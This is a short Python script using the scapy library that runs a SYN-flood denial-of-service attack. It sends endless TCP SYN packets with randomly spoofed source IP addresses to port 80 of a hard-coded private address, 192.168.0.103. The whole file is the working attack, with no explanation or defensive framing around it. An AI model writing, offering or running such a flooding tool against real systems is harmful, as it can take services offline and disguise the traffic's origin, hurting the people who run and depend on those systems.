#! /usr/bin/env python
import socket, random, sys
from scapy.all import *


target_ip = "192.168.0.103"
target_port = 80


def sendSYN(target_ip, sport, dport):
    s_addr = RandIP()
    pkt = IP(src=s_addr, dst=target_ip) / TCP(
        sport=sport, dport=dport, seq=1505066, flags="S"
    )
    send(pkt)


while True:
    sendSYN(target_ip, 1234, target_port)
